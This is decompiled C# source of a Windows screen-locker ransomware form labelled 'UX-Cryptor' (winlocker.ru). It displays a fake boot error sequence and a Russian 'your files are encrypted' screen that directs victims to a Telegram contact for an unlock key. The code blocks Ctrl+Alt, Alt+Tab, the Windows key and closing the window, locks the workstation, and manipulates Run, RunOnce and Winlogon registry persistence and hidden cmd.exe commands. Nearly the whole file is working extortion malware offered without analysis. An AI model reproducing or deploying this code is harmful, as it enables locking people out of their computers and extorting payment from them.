using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices;
using System.Threading;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.Win32;

namespace NET.Internal
{
	// Token: 0x02000011 RID: 17
	[DesignerGenerated]
	internal partial class Worker : Form
	{
		// Token: 0x06000043 RID: 67 RVA: 0x000047B0 File Offset: 0x000029B0
		public Worker()
		{
			base.Load += this.CalcSingleton;
			base.KeyDown += this.DestroySingleton;
			base.FormClosing += this.MoveSingleton;
			this.config = " ";
			this.m_Token = 0;
			this.param = 0;
			this.m_Mock = 0;
			this.expression = false;
			this.helper = 0;
			this.CallSingleton();
		}

		// Token: 0x06000044 RID: 68
		[System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern bool mouse_event(int end_item, int selection_start, int dic_size, int indexOfcfg2, int caller3_count);

		// Token: 0x06000045 RID: 69
		[System.Runtime.InteropServices.DllImport("user32.dll", CharSet = System.Runtime.InteropServices.CharSet.Ansi, ExactSpelling = true, SetLastError = true)]
		public static extern int LockWorkStation();

		// Token: 0x06000046 RID: 70 RVA: 0x00004848 File Offset: 0x00002A48
		private void FlushSingleton(object sender, System.EventArgs e)
		{
			Worker.SetForegroundWindow(base.Handle.ToInt32());
			try
			{
				this.hdn.Focus();
				Label art = this.art;
				if (Operators.ConditionalCompareObjectLess(this.m_Token, 200, false))
				{
					if (Operators.ConditionalCompareObjectLess(this.m_Token, 10, false))
					{
						art.Text = null;
						art.Text = "Booting Windows . . .";
					}
					else if (Operators.ConditionalCompareObjectLess(this.m_Token, 18, false))
					{
						Label label;
						(label = art).Text = Conversions.ToString(Operators.ConcatenateObject(label.Text, Operators.ConcatenateObject("\r\nBoot error: 0x0", Operators.IntDivideObject(Conversion.Int(Conversion.Str(VBMath.Rnd()).Replace(".", "").Trim()), 2))));
					}
					else if (!Operators.ConditionalCompareObjectEqual(this.m_Token, 30, false))
					{
						if (Operators.ConditionalCompareObjectEqual(this.m_Token, 35, false))
						{
							Label label;
							(label = art).Text = label.Text + "\r\nService UXCryptor started.";
						}
						else if (Operators.ConditionalCompareObjectEqual(this.m_Token, 50, false))
						{
							art.ForeColor = Color.Red;
							Label label;
							(label = art).Text = label.Text + "\r\n\r\n * Windows blocked!";
						}
						else if (Operators.ConditionalCompareObjectEqual(this.m_Token, 70, false))
						{
							art.Image = null;
							art.Text = null;
						}
						else if (!Operators.ConditionalCompareObjectEqual(this.m_Token, 80, false))
						{
							if (!Operators.ConditionalCompareObjectEqual(this.m_Token, 85, false))
							{
								if (Operators.ConditionalCompareObjectEqual(this.m_Token, 90, false))
								{
									Label label;
									(label = art).Text = label.Text + " ,::::::;::::::;;;;::::;,   /  /        DOOO\r\n;`::::::`'::::::;;;::::: ,#/  /          DOOO\r\n:`:::::::`;::::::;;::: ;::#  /            DOOO\r\n::`:::::::`;:::::::: ;::::# /              DOO\r\n`:`:::::::`;:::::: ;::::::#/               DOO\r\n :::`:::::::`;; ;:::::::::##                OO\r\n ::::`:::::::`;::::::::;:::#                OO\r\n `:::::`::::::::::::;'`:;::#                O\r\n  `:::::`::::::::;' /  / `:#\r\n   ::::::`:::::;'  /  /   `#";
									this.CalculateSingleton();
								}
								else if (Operators.ConditionalCompareObjectEqual(this.m_Token, 140, false))
								{
									this.BackColor = Color.DarkBlue;
									this.main.Visible = true;
								}
								else if (Operators.ConditionalCompareObjectEqual(this.m_Token, 150, false))
								{
									this.a1.Visible = true;
								}
								else if (Operators.ConditionalCompareObjectEqual(this.m_Token, 160, false))
								{
									this.a2.Visible = true;
								}
								else if (Operators.ConditionalCompareObjectEqual(this.m_Token, 170, false))
								{
									this.UserInfo.Visible = true;
								}
								else if (!Operators.ConditionalCompareObjectEqual(this.m_Token, 177, false))
								{
									if (Operators.ConditionalCompareObjectEqual(this.m_Token, 180, false))
									{
										this.ID.Visible = true;
									}
								}
								else
								{
									this.menu1.Visible = true;
								}
							}
							else
							{
								Label label;
								(label = art).Text = label.Text + "        ;:::::;     ;.\r\n       ,:::::'       ;           OOO\\\r\n       ::::::;       ;          OOOOO\\\r\n       ;:::::;       ;         OOOOOOOO\r\n      ,;::::::;     ;'         / OOOOOOO\r\n    ;:::::::::`. ,,,;.        /  / DOOOOOO\r\n  .';:::::::::::::::::;,     /  /     DOOOO\r\n";
							}
						}
						else
						{
							art.BackColor = Color.DarkRed;
							art.ForeColor = Color.White;
							Label label;
							(label = art).Text = label.Text + "\r\n               ...\r\n             ;::::;\r\n           ;::::; :;\r\n         ;:::::'   :;\r\n";
						}
					}
					else
					{
						Label label;
						(label = art).Text = label.Text + "\r\nMemory section at address 0x0424* is locked!";
					}
					ref object ptr = ref this.m_Token;
					this.m_Token = Operators.AddObject(ptr, 1);
				}
				this.hdn.SelectionStart = Strings.Len(this.hdn.Text);
				this.inputPS.Text = Conversions.ToString(Operators.ConcatenateObject(this.hdn.Text, this.config));
				Cursor.Position = new Point(5, 5);
				base.Activate();
			}
			catch (System.Exception ex)
			{
			}
		}

		// Token: 0x06000047 RID: 71 RVA: 0x00004C70 File Offset: 0x00002E70
		private void PopSingleton(object sender, System.EventArgs e)
		{
			ref object ptr = ref this.param;
			this.param = Operators.AddObject(ptr, 1);
			string[] array = new string[]
			{
				"█",
				"▓",
				"▒",
				"░",
				" "
			};
			object left = this.param;
			if (Operators.ConditionalCompareObjectEqual(left, 1, false))
			{
				this.config = array[0];
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(left, 34, false))
			{
				this.config = array[1];
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(left, 37, false))
			{
				this.config = array[2];
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(left, 40, false))
			{
				this.config = array[3];
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(left, 42, false))
			{
				this.config = array[4];
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(left, 60, false))
			{
				this.param = 0;
			}
		}

		// Token: 0x06000048 RID: 72 RVA: 0x00004D7C File Offset: 0x00002F7C
		private void RegisterSingleton(object sender, System.EventArgs e)
		{
			this.inputPS.Text = this.hdn.Text;
		}

		// Token: 0x06000049 RID: 73 RVA: 0x00004DA0 File Offset: 0x00002FA0
		private void CalcSingleton(object sender, System.EventArgs e)
		{
			this.Text = "UX-Cryptor [GUI] {winlocker.ru}";
			Advisor.MapSingleton.loader.Text = "UX-Cryptor [Runtime] {winlocker.ru}";
			try
			{
				this.ID.Text = Conversions.ToString(Operators.ConcatenateObject("ID: 66-B" + File.ReadAllText(Advisor.MapSingleton.loader.m_Parser) + "1Q", Operators.IntDivideObject(Conversion.Int(File.ReadAllText(Advisor.MapSingleton.loader.m_Parser)), 15)));
			}
			catch (System.Exception ex)
			{
				Advisor.MapSingleton.loader.descriptor = true;
			}
			this.Cursor.Dispose();
			this.hdn.ContextMenu = new ContextMenu();
			this.BackColor = Color.Black;
			this.UserInfo.Text = "Current PC: " + Advisor.SetSingleton.Name;
		}

		// Token: 0x0600004A RID: 74 RVA: 0x00004EA8 File Offset: 0x000030A8
		private void DestroySingleton(object sender, KeyEventArgs e)
		{
			try
			{
				if (Operators.CompareString(this.hdn.Text, "CtrlAltAllowed", false) != 0 && true == (e.Control & e.Alt))
				{
					this.AssetDatabase().Start();
					Worker.LockWorkStation();
				}
				if (e.Alt && e.KeyCode == Keys.Tab)
				{
					this.AssetDatabase().Start();
				}
				if (e.KeyCode == Keys.LWin)
				{
					this.AssetDatabase().Start();
				}
				if (e.KeyCode == Keys.Return)
				{
					Label menu = this.menu1;
					menu.BackColor = Color.White;
					menu.ForeColor = Color.Black;
					if (Interaction.Command().Contains("debug") && Operators.CompareString(this.hdn.Text, "123", false) == 0)
					{
						ProjectData.EndApp();
					}
					if (Operators.CompareString(this.hdn.Text, "5h3h44" + File.ReadAllText(Advisor.MapSingleton.loader.m_Parser), false) != 0)
					{
						this.CalcDatabase().Start();
					}
					else
					{
						this.SearchSingleton();
					}
				}
			}
			catch (System.Exception ex)
			{
				Advisor.MapSingleton.loader.descriptor = true;
			}
			if (Conversions.ToBoolean(Advisor.MapSingleton.loader.descriptor))
			{
				this.CalcDatabase().Start();
				this.errx.Text = "Произошёл сбой! Обратитесь за аварийным ключом.";
				if (Operators.CompareString(this.hdn.Text, "ExceptionKey", false) == 0)
				{
					this.SearchSingleton();
					ProjectData.EndApp();
				}
			}
		}

		// Token: 0x0600004B RID: 75 RVA: 0x00005058 File Offset: 0x00003258
		private void GetSingleton(object sender, KeyPressEventArgs e)
		{
			this.param = 0;
			e.Handled = !LikeOperator.LikeString(Conversions.ToString(e.KeyChar), "[a-z,A-Z\b,0-9]", CompareMethod.Binary);
		}

		// Token: 0x0600004C RID: 76 RVA: 0x00005094 File Offset: 0x00003294
		private void StartSingleton(object sender, System.EventArgs e)
		{
			if (Operators.ConditionalCompareObjectEqual(this.expression, false, false))
			{
				this.ExcludeSingleton();
				this.expression = true;
			}
			this.errx.Visible = true;
			ref object ptr = ref this.m_Mock;
			this.m_Mock = Operators.AddObject(ptr, 1);
			if (Operators.ConditionalCompareObjectEqual(this.m_Mock, 20, false))
			{
				this.expression = false;
				this.errx.Visible = false;
				this.CalcDatabase().Stop();
				this.m_Mock = 0;
			}
		}

		// Token: 0x0600004D RID: 77 RVA: 0x00005130 File Offset: 0x00003330
		public void SearchSingleton()
		{
			checked
			{
				try
				{
					int num = 1;
					do
					{
						Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true).DeleteValue("WIN32_" + Conversions.ToString(num));
						num++;
					}
					while (num <= 8);
				}
				catch (System.Exception ex)
				{
				}
				this.PushSingleton();
				try
				{
					File.Delete(Advisor.MapSingleton.loader.m_Parser);
				}
				catch (System.Exception ex2)
				{
				}
				try
				{
					Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true);
					RegistryKey[] array = new RegistryKey[]
					{
						Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true),
						Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\RunOnce", true),
						Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon", true),
						Advisor.SetSingleton.Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\RunMRU", true)
					};
					array[0].DeleteValue("WindowsInstaller");
					array[0].DeleteValue("MSEdgeUpdateX");
					array[1].DeleteValue("System3264Wow");
					array[1].DeleteValue("OneDrive10293");
					array[1].DeleteValue("WINDOWS");
					array[2].DeleteValue("Shell");
					array[3].DeleteValue("MRUList");
					Process.Start(new ProcessStartInfo("cmd.exe")
					{
						Arguments = System.Environment.ExpandEnvironmentVariables("/k %SystemRoot%\\Explorer.exe"),
						WindowStyle = ProcessWindowStyle.Hidden
					});
				}
				catch (System.Exception ex3)
				{
				}
				ProjectData.EndApp();
			}
		}

		// Token: 0x0600004E RID: 78 RVA: 0x00005340 File Offset: 0x00003540
		private void PushSingleton()
		{
			checked
			{
				try
				{
					string str = Advisor.MapSingleton.loader._Client.Replace("$", "-") + " & del info-0v92.txt /q /s & attrib +h +s -r desktop.ini";
					string[] array = new string[]
					{
						"%userprofile%\\desktop",
						"%systemdrive%\\Users\\Public\\Desktop",
						"%userprofile%\\downloads",
						"%userprofile%\\documents",
						"%userprofile%"
					};
					int num = Advisor.MapSingleton.loader.product.Length - 1;
					for (int i = 0; i <= num; i++)
					{
						if (Directory.Exists(Advisor.MapSingleton.loader.product[i] + ":\\"))
						{
							string str2 = Advisor.MapSingleton.loader.product[i] + ":";
							Interaction.Shell("cmd.exe /c " + str2 + " & " + str, AppWinStyle.Hide, false, -1);
						}
					}
					int num2 = array.Length - 1;
					for (int j = 0; j <= num2; j++)
					{
						Interaction.Shell("cmd.exe /c cd \"" + array[j] + "\"&" + str, AppWinStyle.Hide, false, -1);
					}
				}
				catch (System.Exception ex)
				{
				}
			}
		}

		// Token: 0x0600004F RID: 79 RVA: 0x000054A0 File Offset: 0x000036A0
		private void ReadSingleton(object sender, KeyEventArgs e)
		{
			if (e.KeyCode == Keys.Return)
			{
				Label menu = this.menu1;
				menu.BackColor = Color.SlateBlue;
				menu.ForeColor = Color.White;
			}
		}

		// Token: 0x06000050 RID: 80 RVA: 0x000054D4 File Offset: 0x000036D4
		public void ExcludeSingleton()
		{
			try
			{
				VB$AnonymousDelegate_0 vb$AnonymousDelegate_ = (Worker._Closure$__.$I18-0 != null) ? Worker._Closure$__.$I18-0 : (Worker._Closure$__.$I18-0 = checked(delegate()
				{
					int num = 0;
					do
					{
						Console.Beep(750, 120);
						num++;
					}
					while (num <= 1);
				}));
				VB$AnonymousDelegate_0 vb$AnonymousDelegate_2 = vb$AnonymousDelegate_;
				new System.Threading.Thread((vb$AnonymousDelegate_2 == null) ? null : new System.Threading.ThreadStart(vb$AnonymousDelegate_2.Invoke)).Start();
			}
			catch (System.Exception ex)
			{
			}
		}

		// Token: 0x06000051 RID: 81 RVA: 0x0000554C File Offset: 0x0000374C
		public void CalculateSingleton()
		{
			try
			{
				VB$AnonymousDelegate_0 vb$AnonymousDelegate_ = (Worker._Closure$__.$I19-0 != null) ? Worker._Closure$__.$I19-0 : (Worker._Closure$__.$I19-0 = delegate()
				{
					Console.Beep(800, 950);
				});
				VB$AnonymousDelegate_0 vb$AnonymousDelegate_2 = vb$AnonymousDelegate_;
				new System.Threading.Thread((vb$AnonymousDelegate_2 != null) ? new System.Threading.ThreadStart(vb$AnonymousDelegate_2.Invoke) : null).Start();
			}
			catch (System.Exception ex)
			{
			}
		}

		// Token: 0x06000052 RID: 82 RVA: 0x000055C4 File Offset: 0x000037C4
		public void DeleteSingleton()
		{
			try
			{
				VB$AnonymousDelegate_0 vb$AnonymousDelegate_ = (Worker._Closure$__.$I20-0 != null) ? Worker._Closure$__.$I20-0 : (Worker._Closure$__.$I20-0 = delegate()
				{
					Console.Beep(500, 600);
				});
				VB$AnonymousDelegate_0 vb$AnonymousDelegate_2 = vb$AnonymousDelegate_;
				new System.Threading.Thread((vb$AnonymousDelegate_2 == null) ? null : new System.Threading.ThreadStart(vb$AnonymousDelegate_2.Invoke)).Start();
			}
			catch (System.Exception ex)
			{
			}
		}

		// Token: 0x06000053 RID: 83
		[System.Runtime.InteropServices.DllImport("user32.dll")]
		public static extern int SetForegroundWindow(int num_config);

		// Token: 0x06000054 RID: 84 RVA: 0x0000563C File Offset: 0x0000383C
		private void MoveSingleton(object sender, FormClosingEventArgs e)
		{
			this.AssetDatabase().Start();
			e.Cancel = true;
		}

		// Token: 0x06000055 RID: 85 RVA: 0x0000565C File Offset: 0x0000385C
		private void ResolveSingleton(object sender, System.EventArgs e)
		{
			Worker.mouse_event(2, 0, 0, 3, 3);
			Worker.mouse_event(4, 0, 0, 3, 3);
		}

		// Token: 0x06000056 RID: 86 RVA: 0x00005680 File Offset: 0x00003880
		private void InterruptSingleton(object sender, System.EventArgs e)
		{
			ref object ptr = ref this.helper;
			this.helper = Operators.AddObject(ptr, 1);
			if (Operators.ConditionalCompareObjectEqual(this.helper, 1, false))
			{
				this.DeleteSingleton();
			}
			this.ByPassMessage.Visible = true;
			object left = this.helper;
			if (Operators.ConditionalCompareObjectEqual(left, 5, false))
			{
				this.ByPassWarnMsg.ForeColor = Color.FromArgb(192, 0, 0);
				this.ByPassWarnMsg.BackColor = Color.White;
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(left, 10, false))
			{
				this.ByPassWarnMsg.ForeColor = Color.White;
				this.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0);
				return;
			}
			if (Operators.ConditionalCompareObjectEqual(left, 15, false))
			{
				this.ByPassWarnMsg.ForeColor = Color.FromArgb(192, 0, 0);
				this.ByPassWarnMsg.BackColor = Color.White;
				return;
			}
			if (!Operators.ConditionalCompareObjectEqual(left, 20, false))
			{
				if (Operators.ConditionalCompareObjectEqual(left, 100, false))
				{
					this.ByPassMessage.Visible = false;
					this.AssetDatabase().Stop();
					this.helper = 0;
				}
				return;
			}
			this.ByPassWarnMsg.ForeColor = Color.White;
			this.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0);
		}

		// Token: 0x06000058 RID: 88 RVA: 0x00005830 File Offset: 0x00003A30
		private void CallSingleton()
		{
			this.list = new Container();
			ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Worker));
			this.g1 = new Label();
			this.a1 = new Panel();
			this.s2 = new Label();
			this.s1 = new Label();
			this.border_6 = new PictureBox();
			this.border_5 = new PictureBox();
			this.border_2 = new PictureBox();
			this.border_1 = new PictureBox();
			this.tg = new Label();
			this.main = new Panel();
			this.ByPassMessage = new Panel();
			this.c3 = new PictureBox();
			this.c2 = new PictureBox();
			this.c4 = new PictureBox();
			this.c1 = new PictureBox();
			this.ByPassWarnMsg = new Label();
			this.Safe1 = new PictureBox();
			this.Safe2 = new PictureBox();
			this.ID = new Label();
			this.UserInfo = new Label();
			this.Title = new Label();
			this.menu1 = new Label();
			this.a2 = new Panel();
			this.errx = new Label();
			this.border_8 = new PictureBox();
			this.border_7 = new PictureBox();
			this.border_4 = new PictureBox();
			this.border_3 = new PictureBox();
			this.inputPS = new Label();
			this.keytext = new Label();
			this.hdn = new TextBox();
			this.OrderParameter(new System.Windows.Forms.Timer(this.list));
			this.ForgotDatabase(new System.Windows.Forms.Timer(this.list));
			this.art = new Label();
			this.DestroyDatabase(new System.Windows.Forms.Timer(this.list));
			this.ExcludeDatabase(new System.Windows.Forms.Timer(this.list));
			this.NewDatabase(new System.Windows.Forms.Timer(this.list));
			this.a1.SuspendLayout();
			((ISupportInitialize)this.border_6).BeginInit();
			((ISupportInitialize)this.border_5).BeginInit();
			((ISupportInitialize)this.border_2).BeginInit();
			((ISupportInitialize)this.border_1).BeginInit();
			this.main.SuspendLayout();
			this.ByPassMessage.SuspendLayout();
			((ISupportInitialize)this.c3).BeginInit();
			((ISupportInitialize)this.c2).BeginInit();
			((ISupportInitialize)this.c4).BeginInit();
			((ISupportInitialize)this.c1).BeginInit();
			((ISupportInitialize)this.Safe1).BeginInit();
			((ISupportInitialize)this.Safe2).BeginInit();
			this.a2.SuspendLayout();
			((ISupportInitialize)this.border_8).BeginInit();
			((ISupportInitialize)this.border_7).BeginInit();
			((ISupportInitialize)this.border_4).BeginInit();
			((ISupportInitialize)this.border_3).BeginInit();
			base.SuspendLayout();
			this.g1.Font = new Font("Lucida Console", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.g1.ForeColor = Color.White;
			this.g1.Location = new Point(3, 1);
			this.g1.Name = "g1";
			this.g1.Size = new Size(807, 147);
			this.g1.TabIndex = 0;
			this.g1.Text = componentResourceManager.GetString("g1.Text");
			this.g1.TextAlign = ContentAlignment.MiddleLeft;
			this.a1.Anchor = AnchorStyles.None;
			this.a1.Controls.Add(this.s2);
			this.a1.Controls.Add(this.s1);
			this.a1.Controls.Add(this.border_6);
			this.a1.Controls.Add(this.border_5);
			this.a1.Controls.Add(this.border_2);
			this.a1.Controls.Add(this.border_1);
			this.a1.Controls.Add(this.g1);
			this.a1.Controls.Add(this.tg);
			this.a1.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.a1.Location = new Point(97, 147);
			this.a1.Name = "a1";
			this.a1.Size = new Size(813, 178);
			this.a1.TabIndex = 2;
			this.a1.Visible = false;
			this.s2.Font = new Font("Lucida Console", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.s2.ForeColor = Color.WhiteSmoke;
			this.s2.Location = new Point(593, 148);
			this.s2.Name = "s2";
			this.s2.Size = new Size(140, 23);
			this.s2.TabIndex = 12;
			this.s2.Text = "(Telegram)";
			this.s1.Font = new Font("Lucida Console", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.s1.ForeColor = Color.WhiteSmoke;
			this.s1.Location = new Point(92, 148);
			this.s1.Name = "s1";
			this.s1.Size = new Size(395, 23);
			this.s1.TabIndex = 10;
			this.s1.Text = "Для разблокировки свяжитесь с";
			this.border_6.BackColor = Color.FromArgb(150, 255, 195);
			this.border_6.Dock = DockStyle.Right;
			this.border_6.Location = new Point(811, 1);
			this.border_6.Name = "border_6";
			this.border_6.Size = new Size(2, 176);
			this.border_6.TabIndex = 9;
			this.border_6.TabStop = false;
			this.border_5.BackColor = Color.FromArgb(150, 255, 195);
			this.border_5.Dock = DockStyle.Left;
			this.border_5.Location = new Point(0, 1);
			this.border_5.Name = "border_5";
			this.border_5.Size = new Size(2, 176);
			this.border_5.TabIndex = 8;
			this.border_5.TabStop = false;
			this.border_2.BackColor = Color.FromArgb(150, 255, 195);
			this.border_2.Dock = DockStyle.Bottom;
			this.border_2.Location = new Point(0, 177);
			this.border_2.Name = "border_2";
			this.border_2.Size = new Size(813, 1);
			this.border_2.TabIndex = 7;
			this.border_2.TabStop = false;
			this.border_1.BackColor = Color.FromArgb(150, 255, 195);
			this.border_1.Dock = DockStyle.Top;
			this.border_1.Location = new Point(0, 0);
			this.border_1.Name = "border_1";
			this.border_1.Size = new Size(813, 1);
			this.border_1.TabIndex = 6;
			this.border_1.TabStop = false;
			this.tg.BackColor = Color.Transparent;
			this.tg.Font = new Font("Lucida Console", 15.75f, FontStyle.Underline, GraphicsUnit.Point, 204);
			this.tg.ForeColor = Color.FromArgb(255, 255, 192);
			this.tg.Location = new Point(465, 148);
			this.tg.Name = "tg";
			this.tg.Size = new Size(138, 23);
			this.tg.TabIndex = 11;
			this.tg.Text = "@TGLOCKED";
			this.tg.TextAlign = ContentAlignment.TopCenter;
			this.main.BackColor = Color.DarkBlue;
			this.main.Controls.Add(this.ByPassMessage);
			this.main.Controls.Add(this.Safe1);
			this.main.Controls.Add(this.Safe2);
			this.main.Controls.Add(this.ID);
			this.main.Controls.Add(this.UserInfo);
			this.main.Controls.Add(this.Title);
			this.main.Controls.Add(this.menu1);
			this.main.Controls.Add(this.a2);
			this.main.Controls.Add(this.hdn);
			this.main.Controls.Add(this.a1);
			this.main.Dock = DockStyle.Fill;
			this.main.Font = new Font("Microsoft Sans Serif", 9.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.main.Location = new Point(0, 0);
			this.main.Name = "main";
			this.main.Size = new Size(1006, 540);
			this.main.TabIndex = 1;
			this.main.Visible = false;
			this.ByPassMessage.Anchor = AnchorStyles.None;
			this.ByPassMessage.Controls.Add(this.c3);
			this.ByPassMessage.Controls.Add(this.c2);
			this.ByPassMessage.Controls.Add(this.c4);
			this.ByPassMessage.Controls.Add(this.c1);
			this.ByPassMessage.Controls.Add(this.ByPassWarnMsg);
			this.ByPassMessage.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.ByPassMessage.ForeColor = Color.FromArgb(192, 0, 0);
			this.ByPassMessage.Location = new Point(324, 208);
			this.ByPassMessage.Name = "ByPassMessage";
			this.ByPassMessage.Size = new Size(373, 178);
			this.ByPassMessage.TabIndex = 18;
			this.ByPassMessage.Visible = false;
			this.c3.BackColor = Color.FromArgb(150, 255, 195);
			this.c3.Dock = DockStyle.Right;
			this.c3.Location = new Point(371, 1);
			this.c3.Name = "c3";
			this.c3.Size = new Size(2, 176);
			this.c3.TabIndex = 9;
			this.c3.TabStop = false;
			this.c2.BackColor = Color.FromArgb(150, 255, 195);
			this.c2.Dock = DockStyle.Left;
			this.c2.Location = new Point(0, 1);
			this.c2.Name = "c2";
			this.c2.Size = new Size(2, 176);
			this.c2.TabIndex = 8;
			this.c2.TabStop = false;
			this.c4.BackColor = Color.FromArgb(150, 255, 195);
			this.c4.Dock = DockStyle.Bottom;
			this.c4.Location = new Point(0, 177);
			this.c4.Name = "c4";
			this.c4.Size = new Size(373, 1);
			this.c4.TabIndex = 7;
			this.c4.TabStop = false;
			this.c1.BackColor = Color.FromArgb(150, 255, 195);
			this.c1.Dock = DockStyle.Top;
			this.c1.Location = new Point(0, 0);
			this.c1.Name = "c1";
			this.c1.Size = new Size(373, 1);
			this.c1.TabIndex = 6;
			this.c1.TabStop = false;
			this.ByPassWarnMsg.BackColor = Color.FromArgb(192, 0, 0);
			this.ByPassWarnMsg.Dock = DockStyle.Fill;
			this.ByPassWarnMsg.Font = new Font("Lucida Console", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.ByPassWarnMsg.ForeColor = Color.White;
			this.ByPassWarnMsg.Location = new Point(0, 0);
			this.ByPassWarnMsg.Name = "ByPassWarnMsg";
			this.ByPassWarnMsg.Size = new Size(373, 178);
			this.ByPassWarnMsg.TabIndex = 0;
			this.ByPassWarnMsg.Text = "Замечена и остановлена попытка обмануть систему!";
			this.ByPassWarnMsg.TextAlign = ContentAlignment.MiddleCenter;
			this.Safe1.BackColor = Color.Black;
			this.Safe1.Dock = DockStyle.Left;
			this.Safe1.Location = new Point(0, 0);
			this.Safe1.Name = "Safe1";
			this.Safe1.Size = new Size(70, 540);
			this.Safe1.TabIndex = 14;
			this.Safe1.TabStop = false;
			this.Safe2.BackColor = Color.Black;
			this.Safe2.Dock = DockStyle.Right;
			this.Safe2.Location = new Point(936, 0);
			this.Safe2.Name = "Safe2";
			this.Safe2.Size = new Size(70, 540);
			this.Safe2.TabIndex = 15;
			this.Safe2.TabStop = false;
			this.ID.Anchor = (AnchorStyles.Bottom | AnchorStyles.Left);
			this.ID.Font = new Font("MS Gothic", 9.75f, FontStyle.Bold, GraphicsUnit.Point, 204);
			this.ID.ForeColor = Color.White;
			this.ID.Location = new Point(74, 517);
			this.ID.Name = "ID";
			this.ID.Size = new Size(856, 23);
			this.ID.TabIndex = 17;
			this.ID.Text = "ID: Ошибка идентификации";
			this.ID.TextAlign = ContentAlignment.MiddleLeft;
			this.ID.Visible = false;
			this.UserInfo.Anchor = AnchorStyles.None;
			this.UserInfo.Font = new Font("Lucida Console", 11.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.UserInfo.ForeColor = Color.Silver;
			this.UserInfo.Location = new Point(97, 427);
			this.UserInfo.Name = "UserInfo";
			this.UserInfo.Size = new Size(645, 23);
			this.UserInfo.TabIndex = 16;
			this.UserInfo.TextAlign = ContentAlignment.MiddleLeft;
			this.UserInfo.Visible = false;
			this.Title.Anchor = AnchorStyles.None;
			this.Title.BackColor = Color.White;
			this.Title.Font = new Font("Lucida Console", 14.25f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.Title.ForeColor = Color.Black;
			this.Title.Location = new Point(332, 119);
			this.Title.Name = "Title";
			this.Title.Size = new Size(342, 23);
			this.Title.TabIndex = 13;
			this.Title.Text = "Ваши файлы зашифрованы";
			this.Title.TextAlign = ContentAlignment.MiddleCenter;
			this.menu1.Anchor = AnchorStyles.None;
			this.menu1.BackColor = Color.SlateBlue;
			this.menu1.Font = new Font("Lucida Console", 15.75f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.menu1.ForeColor = Color.White;
			this.menu1.Location = new Point(744, 427);
			this.menu1.Name = "menu1";
			this.menu1.Size = new Size(166, 23);
			this.menu1.TabIndex = 12;
			this.menu1.Text = "Enter [Ввод]";
			this.menu1.TextAlign = ContentAlignment.MiddleCenter;
			this.menu1.Visible = false;
			this.a2.Anchor = AnchorStyles.None;
			this.a2.Controls.Add(this.errx);
			this.a2.Controls.Add(this.border_8);
			this.a2.Controls.Add(this.border_7);
			this.a2.Controls.Add(this.border_4);
			this.a2.Controls.Add(this.border_3);
			this.a2.Controls.Add(this.inputPS);
			this.a2.Controls.Add(this.keytext);
			this.a2.Font = new Font("Microsoft Sans Serif", 12f, FontStyle.Regular, GraphicsUnit.Point, 204);
			this.a2.Location = new Point(97, 330);
			this.a2.Name = "a2";
			this.a2.Size = new Size(813, 94);
			this.a2.TabIndex = 5;
			this.a2.Visible = false;
			this.errx.BackColor = Color.Transparent;
			this.errx.Font = new Font("Lucida Console", 15.75f);
			this.errx.ForeColor = Color.MistyRose;
			this.errx.Location = new Point(3, 62);
			this.errx.Name = "errx";
			this.errx.Size = new Size(807, 24);
			this.errx.TabIndex = 11;
			this.errx.Text = "Ошибка! Введённый код не совпадает с ключом разблокировки.";
			this.errx.TextAlign = ContentAlignment.TopCenter;
			this.errx.Visible = false;
			this.border_8.BackColor = Color.FromArgb(150, 255, 195);
			this.border_8.Dock = DockStyle.Right;
			this.border_8.Location = new Point(811, 1);
			this.border_8.Name = "border_8";
			this.border_8.Size = new Size(2, 92);
			this.border_8.TabIndex = 10;
			this.border_8.TabStop = false;
			this.border_7.BackColor = Color.FromArgb(150, 255, 195);
			this.border_7.Dock = DockStyle.Left;
			this.border_7.Location = new Point(0, 1);
			this.border_7.Name = "border_7";
			this.border_7.Size = new Size(2, 92);
			this.border_7.TabIndex = 9;
			this.border_7.TabStop = false;
			this.border_4.BackColor = Color.FromArgb(150, 255, 195);
			this.border_4.Dock = DockStyle.Bottom;
			this.border_4.Location = new Point(0, 93);
			this.border_4.Name = "border_4";
			this.border_4.Size = new Size(813, 1);
			this.border_4.TabIndex = 8;
			this.border_4.TabStop = false;
			this.border_3.BackColor = Color.FromArgb(150, 255, 195);
			this.border_3.Dock = DockStyle.Top;
			this.border_3.Location = new Point(0, 0);
			this.border_3.Name = "border_3";
			this.border_3.Size = new Size(813, 1);
			this.border_3.TabIndex = 7;
